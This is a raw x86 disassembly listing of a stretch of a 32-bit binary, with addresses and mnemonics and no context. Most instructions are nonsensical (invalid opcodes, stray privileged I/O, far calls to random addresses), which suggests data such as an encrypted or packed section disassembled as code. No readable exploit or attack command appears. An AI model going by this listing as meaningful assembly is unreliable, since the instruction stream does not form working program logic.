  418b01:	and    al,0xf7
  418b03:	cmp    eax,0xd39db295
  418b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b09:	or     cl,bl
  418b0b:	or     bl,BYTE PTR ds:0xc4a391b
  418b11:	xor    DWORD PTR [edx+0x5d],0x7a
  418b15:	mov    ecx,0xa23bb8d2
  418b1a:	xor    dh,dl
  418b1c:	push   edx
  418b1d:	aad    0xf3
  418b1f:	not    cl
  418b21:	(bad)  
  418b23:	test   DWORD PTR [edi+esi*4+0x46],esi
  418b27:	(bad)  
  418b28:	sbb    al,BYTE PTR [eax+ebx*2+0x7dee07b6]
  418b2f:	sbb    eax,0xf76f1f32
  418b34:	aad    0xb2
  418b36:	xor    bh,dl
  418b38:	in     al,0xb0
  418b3a:	jo     0x418b1f
  418b3c:	mov    eax,ds:0x6e872bd3
  418b41:	mov    WORD PTR [edi+0x1ca8349e],es
  418b47:	jns    0x418b89
  418b49:	xchg   BYTE PTR [edi-0x30],bh
  418b4c:	or     BYTE PTR [edx],ah
  418b4e:	xor    DWORD PTR [eax+0x77],ecx
  418b51:	mov    ebp,edi
  418b53:	mov    dh,0x47
  418b55:	mov    eax,ds:0x3c839ca6
  418b5a:	sub    eax,0x1a463299
  418b5f:	dec    edi
  418b60:	pop    ss
  418b61:	stc    
  418b62:	inc    esi
  418b63:	xor    ecx,DWORD PTR [edi-0x2713f0ec]
  418b69:	adc    edi,0x9953a0bc
  418b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b70:	or     esi,DWORD PTR [ebp+0x16]
  418b73:	into   
  418b74:	xchg   ebx,eax
  418b75:	xchg   ebx,eax
  418b76:	clc    
  418b77:	mov    ds:0x576f48b6,eax
  418b7c:	enter  0x1489,0x83
  418b80:	mov    ds:0xec1d4aee,al
  418b85:	cs sahf 
  418b87:	fdiv   DWORD PTR [edx+0x39]
  418b8a:	(bad)  
  418b8b:	jl     0x418b14
  418b8d:	data16 xor al,0x75
  418b90:	jmp    0x418bfc
  418b92:	nop
  418b93:	or     eax,0xdb970626
  418b98:	mov    edi,0xec2ae1f7
  418b9d:	or     cl,BYTE PTR [edi]
  418b9f:	dec    esi
  418ba0:	inc    ecx
  418ba1:	xchg   DWORD PTR [ecx+0x4d],esi
  418ba4:	adc    al,0xd2
  418ba6:	das    
  418ba7:	push   ebx
  418ba8:	mov    eax,ds:0x30ff3094
  418bad:	xor    al,0x96
  418baf:	pop    ebp
  418bb0:	xlat   BYTE PTR ds:[ebx]
  418bb1:	inc    eax
  418bb2:	inc    esi
  418bb3:	inc    ebx
  418bb4:	das    
  418bb5:	retf   0xb4b6
  418bb8:	test   eax,0x387c4de1
  418bbd:	xchg   esp,eax
  418bbe:	xchg   ebp,eax
  418bbf:	or     DWORD PTR [edx+0x4e],0xffffffe2
  418bc3:	lods   al,BYTE PTR ds:[esi]
  418bc4:	retf   0x8395
  418bc7:	adc    cl,BYTE PTR [edi-0x236fb05a]
  418bcd:	mov    ah,0x2d
  418bcf:	jo     0x418b84
  418bd1:	or     DWORD PTR [ebx],ebp
  418bd3:	cmp    eax,0x5bc4e3ab
  418bd8:	xor    eax,0x53634c8e
  418bdd:	adc    BYTE PTR [edx],bh
  418bdf:	mov    bh,0x1e
  418be2:	xor    eax,0x714b9871
  418be7:	int3   
  418be8:	leave  
  418be9:	xor    al,0x32
  418beb:	sub    BYTE PTR [ebx+eiz*2-0x6767d007],dh
  418bf2:	fwait
  418bf3:	scas   eax,DWORD PTR es:[edi]
  418bf4:	jmp    0x940968d2
  418bf9:	aaa    
  418bfa:	ret    0x129c
  418bfd:	xlat   BYTE PTR ds:[ebx]
  418bfe:	sbb    al,0x51
  418c00:	push   ebp
  418c01:	sti    
  418c02:	cwde   
  418c03:	call   0x1bf2:0x191780e0
  418c0a:	ret    
  418c0b:	push   ebx
  418c0c:	pushf  
  418c0d:	leave  
  418c0e:	out    dx,eax
  418c0f:	and    BYTE PTR [edi],ch
  418c11:	jmp    0xf30a733e
  418c16:	inc    edx
  418c17:	(bad)  
  418c18:	loop   0x418c39
  418c1a:	(bad)  
  418c1b:	int3   
  418c1c:	sti    
  418c1d:	pop    edi
  418c1e:	xlat   BYTE PTR ds:[ebx]
  418c20:	sbb    BYTE PTR [ecx+0x5265ed7b],bh
  418c26:	pop    ss
  418c27:	rcl    dh,1
  418c29:	nop
  418c2a:	mov    edx,0x17893964
  418c2f:	pop    ds
  418c30:	xor    esi,DWORD PTR [edi]
  418c32:	cmp    dl,al
  418c34:	cld    
  418c35:	xchg   ecx,eax
  418c36:	sub    bl,BYTE PTR [ecx]
  418c38:	cmp    al,0xb8
  418c3a:	lods   al,BYTE PTR ds:[esi]
  418c3b:	frstor [ebx]
  418c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c3e:	fwait
  418c3f:	addr16 dec esi
  418c41:	iret   
  418c42:	repnz dec ebp
  418c44:	test   al,0xc5
  418c46:	hlt    
  418c47:	push   ebp
  418c48:	out    0x3b,al
  418c4a:	cmc    
  418c4b:	adc    al,0x55
  418c4d:	stc    
  418c4e:	sar    DWORD PTR [edi],cl
  418c50:	test   DWORD PTR [eax-0x46],ebx
  418c53:	add    esi,0x29e34fa2
  418c59:	and    al,0xc1
  418c5b:	test   al,0x1d
  418c5d:	cmp    DWORD PTR [edx-0x23],ebx
  418c60:	ror    DWORD PTR [eax-0x68],cl
  418c63:	jmp    FWORD PTR [ecx-0x48]
  418c66:	cmp    al,bh
  418c68:	enter  0x233,0x46
  418c6c:	lods   eax,DWORD PTR ds:[esi]
  418c6d:	sbb    BYTE PTR [edi+0x10cf8d92],dl
  418c73:	jb     0x418bf8
  418c75:	sbb    BYTE PTR [ebx],bh
  418c77:	pop    edx
  418c78:	jmp    0x418c6c
  418c7a:	dec    ebp
  418c7b:	pop    edx
  418c7c:	and    esi,0x22
  418c7f:	ins    BYTE PTR es:[edi],dx
  418c80:	(bad)  
  418c82:	sub    esp,ebx
  418c84:	ret    
  418c85:	and    BYTE PTR [esi-0x53fa3684],0xc8
  418c8c:	popa   
  418c8d:	fstp   st(3)
  418c8f:	jnp    0x418c21
  418c91:	pusha  
  418c92:	in     al,dx
  418c93:	icebp  
  418c94:	(bad)  
  418c96:	cmp    esi,DWORD PTR [eax*8+0x161b8725]
  418c9d:	fs mov al,0x47
  418ca0:	jg     0x418c9b
  418ca2:	add    DWORD PTR [esi+0x6b],eax
  418ca5:	enter  0xf48f,0x85
  418ca9:	je     0x418c3e
  418cab:	jmp    0xea01e86f
  418cb0:	pop    ecx
  418cb1:	cmp    esp,ebp
  418cb3:	les    ebx,FWORD PTR [esi]
  418cb5:	xchg   DWORD PTR ds:0x1ba7e52f,edx
  418cbb:	outs   dx,BYTE PTR ds:[esi]
  418cbc:	xor    al,0xa0
  418cbe:	or     DWORD PTR [edi+0x41],0xffffff91
  418cc2:	pop    ds
  418cc3:	inc    ebx
  418cc4:	cmc    
  418cc5:	loopne 0x418c99
  418cc7:	stos   BYTE PTR es:[edi],al
  418cc8:	call   0xfb77:0x368b515c
  418ccf:	sbb    BYTE PTR [ecx+0x38],bl
  418cd2:	mov    al,ds:0x44e04f3
  418cd7:	dec    ebp
  418cd8:	ret    0xfd2
  418cdb:	sbb    ecx,DWORD PTR [ecx]
  418cdd:	imul   ebx,DWORD PTR [edi-0x1],0xbf31069d
  418ce4:	xchg   esi,eax
  418ce5:	pop    ss
  418ce6:	test   DWORD PTR [ecx],esp
  418ce8:	xlat   BYTE PTR ds:[ebx]
  418ce9:	or     esi,DWORD PTR [eax+0x39e4e717]
  418cef:	inc    esp
  418cf0:	cmp    edi,edx
  418cf2:	mov    ebp,0x8ca80a29
  418cf7:	loope  0x418cfd
  418cf9:	imul   ebx,esp,0xd0c7af1d
  418cff:	ret    
  418d00:	xor    eax,0x33c357b3
  418d05:	in     eax,0x33
  418d07:	pop    edi
  418d08:	mov    bh,dh
  418d0a:	shr    DWORD PTR [ebx-0x69ef232d],cl
  418d10:	sbb    dh,BYTE PTR [ebp+0x7dd649d5]
  418d16:	and    BYTE PTR [edx-0x59],al
  418d19:	adc    edi,DWORD PTR ds:0x609af92b
  418d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d20:	adc    esi,DWORD PTR [ebx+0x20cfe3f1]
  418d26:	and    dl,ah
  418d28:	repnz sub esp,esi
  418d2b:	sar    BYTE PTR fs:[eax-0x3d],cl
  418d2f:	xor    ch,BYTE PTR [ebp+edi*1+0x1c651f36]
  418d36:	pop    esi
  418d37:	sub    eax,0x2f367653
  418d3c:	ret    
  418d3d:	int    0x15
  418d3f:	in     eax,dx
  418d40:	jno    0x418d2e
  418d42:	call   0x7fc8dbea
  418d47:	shr    ecx,1
  418d49:	mov    esi,DWORD PTR [eax+0x2f]
  418d4c:	out    0x84,eax
  418d4e:	inc    ebp
  418d4f:	call   0xc489:0x2323400b
  418d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d57:	or     DWORD PTR ss:[ebx-0x1e53ff1a],edx
  418d5e:	lea    ecx,ds:0x783c7d9e
  418d64:	xchg   edi,eax
  418d65:	pop    ss
  418d66:	mov    cl,0x43
  418d68:	les    edx,FWORD PTR ds:0x16f291f0
  418d6e:	int    0xc2
  418d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d71:	(bad)  
  418d72:	mov    esi,0x3b893a3b
  418d77:	aad    0xf2
  418d79:	push   edx
  418d7a:	ins    DWORD PTR es:[edi],dx
  418d7b:	adc    DWORD PTR [eax],ebp
  418d7d:	pop    edx
  418d7e:	lods   eax,DWORD PTR ds:[esi]
  418d7f:	jb     0x418dc6
  418d81:	std    
  418d82:	enter  0x7efd,0xf4
  418d86:	mov    ds:0xeab70244,al
  418d8b:	or     ch,BYTE PTR [ebx]
  418d8d:	add    eax,0x9a6ce6de
  418d92:	repz bound edx,QWORD PTR ds:0x55afac87
  418d99:	jnp    0x418dfb
  418d9b:	int    0xe8
  418d9d:	mov    ds:0x6956d1b2,eax
  418da2:	imul   ebx,esp,0x25
  418da5:	mov    eax,0x3bb5b80c
  418daa:	mov    esi,0x8eb6b037
  418daf:	pop    ss
  418db0:	inc    eax
  418db1:	dec    ebp
  418db2:	mov    cl,0x40
  418db4:	sahf   
  418db5:	push   ecx
  418db6:	dec    esi
  418db7:	mov    edx,0x2d74af0d
  418dbc:	mov    bl,0x83
  418dbe:	aas    
  418dbf:	sahf   
  418dc0:	cmp    esi,DWORD PTR [esi]
  418dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc3:	ins    DWORD PTR es:[edi],dx
  418dc4:	mov    ebp,DWORD PTR [edx]
  418dc6:	fwait
  418dc7:	sti    
  418dc8:	ds mov ?,eax
  418dcb:	imul   ebp,esp,0xb76a81af
  418dd1:	imul   eax,eax,0x215764a7
  418dd7:	sub    al,0xff
  418dd9:	(bad)  ds:0xfff8993a
  418ddf:	sub    al,0x53
  418de1:	jnp    0x418e14
  418de3:	add    BYTE PTR [edx],dl
  418de5:	xor    eax,0x23dba129
  418dea:	inc    ebx
  418deb:	aad    0x4d
  418ded:	cwde   
  418dee:	and    ebx,DWORD PTR [edx+ebp*1+0x4a]
  418df2:	(bad)  
  418df3:	push   ds
  418df4:	std    
  418df5:	out    dx,al
  418df6:	xor    ah,0x16
  418df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dfa:	xor    bh,BYTE PTR [ecx-0x5c]
  418dfd:	pushf  
  418dfe:	vandnps xmm7,xmm2,xmm3
  418e02:	push   esi
  418e03:	jge    0x418de5
  418e05:	push   0x51
  418e07:	ret    0xd493
  418e0a:	(bad)  
  418e0b:	loop   0x418e67
  418e0d:	sbb    ah,BYTE PTR [edi+eiz*8]
  418e10:	bound  eax,QWORD PTR [ecx]
  418e12:	pop    ebp
  418e13:	mov    bh,0xaf
  418e15:	test   eax,0xc3f979b6
  418e1a:	or     esi,0x13
  418e1d:	clc    
  418e1e:	test   DWORD PTR [edi+ecx*8],esp
  418e21:	daa    
  418e22:	jno    0x418e51
  418e24:	or     eax,0xc5aad26d
  418e29:	or     eax,0xa05c96da
  418e2e:	xor    eax,0x6ccb8b2a
  418e33:	dec    ecx
  418e34:	adc    al,0x95
  418e36:	cmp    BYTE PTR [ecx-0x22],0xf6
  418e3a:	mov    ds:0x7bc699ba,eax
  418e3f:	ja     0x418e2c
  418e41:	pop    esp
  418e42:	pop    es
  418e43:	sbb    eax,0xfd1fe67d
  418e48:	dec    eax
  418e49:	in     al,dx
  418e4a:	xor    eax,edi
  418e4c:	aad    0xc
  418e4e:	cs inc edx
  418e50:	add    ebx,DWORD PTR [esi-0x3eea480f]
  418e56:	loop   0x418e71
  418e58:	jae    0x418eb5
  418e5a:	pop    edi
  418e5b:	test   eax,0x660ae1bf
  418e60:	shl    BYTE PTR [ecx],0x37
  418e63:	hlt    
  418e64:	sub    DWORD PTR [esi+0x16],ecx
  418e67:	xlat   BYTE PTR ds:[ebx]
  418e68:	or     eax,0x6cb4a5cb
  418e6d:	icebp  
  418e6e:	sbb    ecx,DWORD PTR ds:0x3b104c90
  418e74:	leave  
  418e75:	xor    al,0x8a
  418e77:	ret    0xbfd5
  418e7a:	or     al,0x4f
  418e7c:	pop    esi
  418e7e:	pop    eax
  418e7f:	jae    0x418e17
  418e81:	adc    ch,BYTE PTR [eax]
  418e83:	int    0xd4
  418e85:	sbb    esi,DWORD PTR es:[eax+ebp*8]
  418e89:	icebp  
  418e8a:	push   0xf6258c39
  418e8f:	dec    esp
  418e90:	mov    ebp,0x83c36084
  418e95:	push   eax
  418e96:	push   ss
  418e97:	retf   
  418e98:	cmp    dh,BYTE PTR [edi]
  418e9a:	mov    es,WORD PTR [edi+0x65f2d03b]
  418ea0:	in     al,0x12
  418ea2:	popa   
  418ea3:	xlat   BYTE PTR ds:[ebx]
  418ea4:	int3   
  418ea5:	sbb    BYTE PTR [eax-0x63632ab0],bh
  418eab:	ins    BYTE PTR es:[edi],dx
  418eac:	loopne 0x418ea4
  418eae:	adc    eax,DWORD PTR [esi-0x77]
  418eb1:	jp     0x418eed
  418eb3:	pop    ds
  418eb4:	icebp  
  418eb5:	mov    DWORD PTR [eax+0x13],ecx
  418eb8:	xchg   esp,eax
  418eb9:	push   edi
  418eba:	loopne 0x418f0c
  418ebc:	jns    0x418efc
  418ebe:	push   cs
  418ebf:	push   ds
  418ec0:	repnz neg BYTE PTR [edi+0x35]
  418ec4:	fdivr  DWORD PTR [eax+0x1b2f5e9e]
  418eca:	fidivr WORD PTR [edi]
  418ecc:	push   esp
  418ecd:	cmp    eax,0x6dd96f36
  418ed2:	leave  
  418ed3:	jbe    0x418e6a
  418ed5:	jbe    0x418f38
  418ed7:	xchg   edi,eax
  418ed8:	popa   
  418ed9:	ret    0xe1d9
  418edc:	aad    0xdc
  418ede:	call   0x6b08:0x7f9b6b0b
  418ee5:	xor    BYTE PTR [ebx+0x64],0xb2
  418ee9:	mov    cl,BYTE PTR [edi-0x59a5c5c1]
  418eef:	ins    BYTE PTR es:[edi],dx
  418ef0:	mov    esi,0x61406e28
  418ef5:	mov    ecx,0xe19465df
  418efa:	retf   
  418efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418efc:	xchg   DWORD PTR [edi+0x7d],ecx
  418eff:	push   ds
  418f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f01:	out    dx,al
  418f02:	jg     0x418f40
  418f04:	xor    edx,DWORD PTR [edi]
  418f06:	cmovb  edi,edx
  418f09:	hlt    
  418f0a:	scas   al,BYTE PTR es:[edi]
  418f0b:	ss out dx,al
  418f0d:	mov    esp,0x9782d0b3
  418f12:	test   al,0x4e
  418f14:	ja     0x418f04
  418f16:	mov    al,0xa
  418f18:	sbb    eax,0xd74c8c5a
  418f1d:	in     eax,0x51
  418f1f:	imul   esi,DWORD PTR [edx-0x3b],0x8f7f2e
  418f26:	outs   dx,BYTE PTR ds:[esi]
  418f27:	outs   dx,BYTE PTR ds:[esi]
  418f28:	push   ebx
  418f29:	mov    esi,0x445dff78
  418f2e:	push   ss
  418f2f:	jl     0x418ebd
  418f31:	retf   0xfdb3
  418f34:	jnp    0x418f2d
  418f36:	je     0x418f94
  418f38:	push   esi
  418f39:	mov    esp,0x7d3cba00
  418f3e:	or     al,0x11
  418f40:	outs   dx,DWORD PTR ds:[esi]
  418f41:	or     DWORD PTR [edx+0x384072e3],esi
  418f47:	or     esi,DWORD PTR [edi+0x19]
  418f4a:	pop    ds
  418f4b:	jnp    0x418ed8
  418f4d:	xor    BYTE PTR [edx-0x23],dl
  418f50:	add    al,0xe3
  418f52:	push   0x1d
  418f54:	cmc    
  418f55:	fcom   QWORD PTR [ecx+0x38f3b972]
  418f5b:	hlt    
  418f5c:	xchg   ebp,esi
  418f5e:	(bad)  
  418f5f:	fsub   DWORD PTR [eax+0x26]
  418f62:	ret    
  418f63:	jecxz  0x418f08
  418f65:	retf   
  418f66:	lahf   
  418f67:	push   edi
  418f68:	fnstenv [ebx]
  418f6a:	cmp    eax,0x9649b2bb
  418f6f:	not    esp
  418f71:	cmc    
  418f72:	pop    ebx
  418f73:	inc    eax
  418f74:	dec    edx
  418f75:	jg     0x418fd0
  418f77:	je     0x418fe6
  418f79:	mov    esi,0x75ac5601
  418f7e:	add    eax,DWORD PTR [edx+0xa5539c1]
  418f84:	jb     0x418f7d
  418f86:	push   edx
  418f87:	js     0x418f3f
  418f89:	and    eax,0xfc9b8b80
  418f8e:	pop    esi
  418f8f:	into   
  418f90:	adc    al,0x98
  418f92:	adc    al,0x10
  418f94:	lods   al,BYTE PTR ds:[esi]
  418f95:	adc    BYTE PTR [ebx-0x5c],bh
  418f98:	and    DWORD PTR [edi-0x7a],ebx
  418f9b:	mov    edx,0xd302005e
  418fa0:	mov    al,0x83
  418fa2:	add    al,0x86
  418fa4:	sar    BYTE PTR [esi+0x7e],1
  418fa7:	adc    edx,DWORD PTR [edi]
  418fa9:	dec    BYTE PTR [eax]
  418fab:	sbb    BYTE PTR [esp+eiz*4+0x7438c3fa],ch
  418fb2:	in     al,0xbf
  418fb4:	je     0x418f87
  418fb6:	and    al,cl
  418fb8:	mov    eax,0xa35b4e9e
  418fbd:	or     eax,0x6d75a56b
  418fc2:	pop    es
  418fc3:	nop
  418fc4:	out    0x6c,eax
  418fc6:	inc    eax
  418fc7:	pop    esi
  418fc8:	xor    al,0xe9
  418fca:	inc    esp
  418fcb:	push   ss
  418fcc:	std    
  418fcd:	scas   eax,DWORD PTR es:[edi]
  418fce:	jp     0x418f9f
  418fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fd1:	in     al,0xf9
  418fd3:	stc    
  418fd4:	inc    edi
  418fd5:	rol    DWORD PTR [edx],0xff
  418fd8:	mov    bl,0xb0
  418fda:	add    edx,ebx
  418fdc:	cwde   
  418fdd:	aaa    
  418fde:	fwait
  418fdf:	mov    ch,0x80
  418fe1:	retf   0x236b
  418fe4:	pushf  
  418fe5:	stos   DWORD PTR es:[edi],eax
  418fe6:	outs   dx,DWORD PTR ds:[esi]
  418fe7:	neg    eax
  418fe9:	dec    eax
  418fea:	adc    BYTE PTR [ecx-0x60],dh
  418fed:	popf   
  418fee:	jp     0x419048
  418ff0:	je     0x41901b
  418ff2:	sti    
  418ff3:	or     bl,BYTE PTR [ecx]
  418ff5:	pop    ds
  418ff6:	rcr    ah,cl
  418ff8:	jb     0x418f8a
  418ffa:	inc    edi
  418ffb:	popa   
  418ffc:	call   0x4930:0xce485bb
  419003:	data16 aas 
  419005:	ds int 0x5f
  419008:	sbb    BYTE PTR [edi+ebx*8-0x3542ca75],bh
  41900f:	aaa    
  419010:	sub    al,0x3d
  419012:	pop    ds
  419013:	sti    
  419014:	(bad)  
  419015:	push   cs
  419016:	mov    dh,BYTE PTR [ebx+0x3653a4eb]
  41901c:	and    al,ch
  41901e:	push   eax
  41901f:	jno    0x419044
  419021:	pop    esi
  419022:	xchg   ebx,eax
  419023:	dec    edx
  419024:	or     BYTE PTR [esi+0x0],al
	...
  4191f6:	adc    eax,0x773f6240
  4191fb:	aas    
  4191fc:	pop    ebp
  4191fd:	push   0xffffff86
  4191ff:	jb     0x419263
  419201:	stc    
  419202:	xor    bl,BYTE PTR [ecx+0x1d]
  419205:	int3   
  419206:	xor    cl,BYTE PTR [ebp+0x7250001]
  41920c:	add    BYTE PTR [eax],al
  41920e:	loop   0x4191d4
  419210:	inc    edi
  419211:	repnz pusha 
  419213:	in     al,dx
  419214:	ss mov dl,0x97
  419217:	xchg   ah,bh
  419219:	repz sub esi,DWORD PTR [edx+0x4a]
  41921d:	mov    ecx,0x965bcc9c
  419222:	pop    esi
  419223:	mov    ds:0xca6100d6,eax
  419228:	dec    esi
  419229:	or     cl,BYTE PTR [ecx]
  41922b:	mov    BYTE PTR [esi+0x5ae70126],ah
  419231:	xchg   edi,eax
  419232:	inc    esi
  419233:	pop    edi
  419234:	daa    
  419235:	jmp    0x42d1:0xf10344ae
  41923c:	or     eax,0xbd72bb37
  419241:	xchg   ebx,eax
  419242:	clc    
  419243:	sub    eax,0x3f610bc6
  419248:	ins    BYTE PTR es:[edi],dx
  419249:	(bad)  
  41924a:	jmp    0x41922d
  41924c:	in     al,dx
  41924d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924e:	jne    0x419257
  419250:	pop    ss
  419251:	mov    cl,0x21
  419253:	lods   al,BYTE PTR ds:[esi]
  419254:	pop    ebx
  419255:	iret   
  419256:	jb     0x41926b
  419258:	xchg   BYTE PTR [ebp-0x501759c9],al
  41925e:	ins    DWORD PTR es:[edi],dx
  41925f:	cwde   
  419260:	cmp    eax,0x7e17f97a
  419265:	out    dx,eax
  419266:	xor    al,0xf7
  419268:	add    ecx,0x75df8e25
  41926e:	jg     0x419263
  419270:	or     eax,0x590a85c8
  419275:	stos   DWORD PTR es:[edi],eax
  419276:	jl     0x419235
  419278:	cwde   
  419279:	rcr    DWORD PTR [edx-0x2fb6ed43],1
  41927f:	inc    ebp
  419280:	(bad)  
  419282:	loope  0x4192e6
  419284:	or     BYTE PTR [esi-0x3b],bl
  419287:	jns    0x4192dd
  419289:	mov    ebp,DWORD PTR [esi-0x13]
  41928c:	addr16 push edi
  41928e:	mov    ds:0xb029b646,eax
  419293:	dec    eax
  419294:	lahf   
  419295:	das    
  419296:	sub    DWORD PTR [ebx-0x3a6b99c5],edi
  41929c:	inc    ebx
  41929d:	inc    ebx
  41929e:	jmp    0xb9e9:0xe5497a4c
  4192a5:	ja     0x419270
  4192a7:	jns    0x4192a8
  4192a9:	inc    edi
  4192aa:	mov    dh,0xcc
  4192ac:	pop    esp
  4192ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ae:	fs sbb al,0xfa
  4192b1:	add    al,0xcb
  4192b4:	scas   al,BYTE PTR es:[edi]
  4192b5:	test   eax,0x61afdd96
  4192ba:	jmp    0x4192da
  4192bc:	das    
  4192bd:	mov    dl,BYTE PTR [esi-0x52]
  4192c0:	or     al,0x97
  4192c2:	enter  0xe9fb,0xf7
  4192c6:	loop   0x419251
  4192c8:	clc    
  4192c9:	rcl    BYTE PTR [esi+0x67fa97cf],1
  4192cf:	dec    esp
  4192d0:	pop    eax
  4192d1:	(bad)  
  4192d2:	dec    eax
  4192d3:	cld    
  4192d4:	xor    DWORD PTR [ebx-0x5a821c4f],ecx
  4192da:	pusha  
  4192db:	pop    ecx
  4192dc:	add    ah,dh
  4192de:	call   0x9ee63dc7
  4192e3:	lahf   
  4192e4:	pop    eax
  4192e5:	push   0x46b3081e
  4192ea:	aaa    
  4192eb:	stos   DWORD PTR es:[edi],eax
  4192ec:	das    
  4192ed:	inc    esp
  4192ee:	test   BYTE PTR [esi],bl
  4192f0:	jmp    0xd887e39c
  4192f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f7:	imul   edi,DWORD PTR [edi-0x775dff92],0xffffff9a
  4192fe:	adc    ah,BYTE PTR [edx]
  419300:	(bad)  
  419301:	in     eax,dx
  419302:	shl    BYTE PTR [edx+0x7b],1
  419305:	mov    eax,ds:0xb3100350
  41930a:	push   edx
  41930b:	inc    esi
  41930c:	std    
  41930d:	hlt    
  41930e:	repz or al,0xd1
  419311:	inc    eax
  419312:	in     eax,dx
  419313:	jae    0x41936a
  419315:	and    dl,BYTE PTR [ebp+0x757676da]
  41931b:	inc    esi
  41931c:	sti    
  41931d:	sbb    al,bh
  41931f:	loopne 0x4192cd
  419321:	mov    ?,WORD PTR [esi]
  419323:	dec    edx
  419324:	sub    BYTE PTR [eax+0x24c8508e],ah
  41932a:	int    0xd4
  41932c:	xor    al,0xf2
  41932e:	fimul  WORD PTR [ebp-0x595521b0]
  419334:	outs   dx,BYTE PTR ds:[esi]
  419335:	dec    ebx
  419336:	ds pop esp
  419338:	shl    BYTE PTR [ecx+eiz*1+0x2f27da22],1
  41933f:	cwde   
  419340:	dec    eax
  419341:	loopne 0x419302
  419343:	das    
  419344:	pop    edi
  419345:	push   eax
  419346:	push   esi
  419347:	mov    bh,0x37
  419349:	jle    0x41932b
  41934b:	push   ds
  41934c:	jecxz  0x41937b
  41934e:	mul    DWORD PTR [eax+0x361aa424]
  419354:	call   0x37ad2132
  419359:	scas   eax,DWORD PTR es:[edi]
  41935a:	or     DWORD PTR [edx+0x5b],edx
  41935d:	push   edi
  41935e:	aam    0xb3
  419360:	and    BYTE PTR [ebx+eiz*4+0x20],dl
  419364:	shr    BYTE PTR [ebp+0x54607522],1
  41936a:	add    DWORD PTR ds:0x5dddae61,0xffffffa5
  419371:	dec    edx
  419372:	dec    ebp
  419373:	add    al,BYTE PTR [esi+0x363bd176]
  419379:	test   al,0xb3
  41937b:	mov    al,0x1b
  41937d:	push   0xffffff8d
  41937f:	das    
  419380:	call   0x3cd0:0xf6692a45
  419387:	ja     0x419323
  419389:	aam    0xe3
  41938b:	and    eax,0xd5e0f258
  419390:	add    ecx,DWORD PTR [edi-0x70cd5a96]
  419396:	add    BYTE PTR [eax-0x440ee921],dl
  41939c:	sub    cl,al
  41939e:	(bad)  
  41939f:	jmp    0x419358
  4193a1:	fiadd  DWORD PTR [ebp+0x3d]
  4193a4:	idiv   DWORD PTR [ebx+0x5d]
  4193a7:	pop    ebp
  4193a8:	jae    0x419367
  4193aa:	dec    ebx
  4193ab:	pop    es
  4193ac:	mov    DWORD PTR [esi-0x75],ecx
  4193af:	(bad)
  4193b3:	jecxz  0x4193df
  4193b5:	push   eax
  4193b6:	jb     0x41942a
  4193b8:	mov    dl,0x2e
  4193ba:	jmp    0x79520ded
  4193bf:	int3   
  4193c0:	(bad)  
  4193c1:	cmp    esp,DWORD PTR [eax+0x52]
  4193c4:	and    DWORD PTR [ecx+0x6d],eax
  4193c7:	and    al,0xdb
  4193c9:	aam    0x87
  4193cb:	push   ecx
  4193cc:	sub    dh,BYTE PTR [eax+0x5e]
  4193cf:	(bad)  
  4193d0:	cmp    esp,DWORD PTR [edi+0x6a]
  4193d3:	gs ret 
  4193d5:	ins    DWORD PTR es:[edi],dx
  4193d6:	loopne 0x41937b
  4193d8:	scas   al,BYTE PTR es:[edi]
  4193d9:	fsubr  QWORD PTR [ecx+0x11c28516]
  4193df:	push   0x6e
  4193e1:	cmp    eax,0x72fa3d65
  4193e6:	push   0xc97ceb47
  4193eb:	mov    edi,0x2b15c2a2
  4193f0:	inc    ebx
  4193f1:	add    bh,BYTE PTR [ecx+0x2d]
  4193f4:	or     ecx,DWORD PTR [ebx]
  4193f6:	push   ebx
  4193f7:	mov    cs,WORD PTR ss:[ecx+0x337fc7f7]
  4193fe:	adc    BYTE PTR [ebp+0x709553f6],al
  419404:	jnp    0x419457
  419406:	mov    esp,0x24ef731b
  41940b:	loope  0x41940c
  41940d:	stc    
  41940e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41940f:	push   ecx
  419410:	dec    esp
  419411:	mov    ebx,0x676b6482
  419416:	sub    esi,DWORD PTR [ebp+0x4e]
  419419:	xlat   BYTE PTR ds:[ebx]
  41941a:	push   0x8860a3a6
  41941f:	push   esi
  419420:	mov    dh,0x57
  419422:	and    ebx,DWORD PTR [edx]
  419424:	fwait
  419425:	cmp    eax,0x78bf6e4
  41942a:	push   ds
  41942b:	mov    ebp,ebp
  41942d:	mov    ah,BYTE PTR [edx-0x43]
  419430:	push   cs
  419431:	xor    eax,0x85b7f98c
  419436:	in     al,0x7d
  419438:	mov    bl,BYTE PTR [eax-0x6fc60b6d]
  41943e:	adc    ah,BYTE PTR [eax]
  419440:	fwait
  419441:	add    esi,esi
  419443:	jne    0x419411
  419445:	xor    ebp,ecx
  419447:	push   esp
  419448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419449:	popa   
  41944a:	inc    ebp
  41944b:	xor    ebx,DWORD PTR [edx+0x65]
  41944e:	stos   DWORD PTR es:[edi],eax
  41944f:	loopne 0x4193d3
  419451:	cmp    BYTE PTR [esi+0x52],cl
  419454:	retf   
  419455:	jns    0x41949f
  419457:	cwde   
  419458:	adc    eax,0x981e2c5d
  41945d:	outs   dx,DWORD PTR ds:[esi]
  41945e:	(bad)  
  41945f:	sbb    al,0x59
  419461:	stc    
  419462:	or     BYTE PTR [esi-0x289cecf5],dh
  419468:	loopne 0x4193f4
  41946a:	dec    eax
  41946b:	or     esp,DWORD PTR [edi]
  41946d:	addr16 clc 
  41946f:	push   edx
  419470:	sbb    ch,bl
  419472:	sbb    esi,DWORD PTR ds:0x6fd63cb5
  419478:	jmp    DWORD PTR [eax]
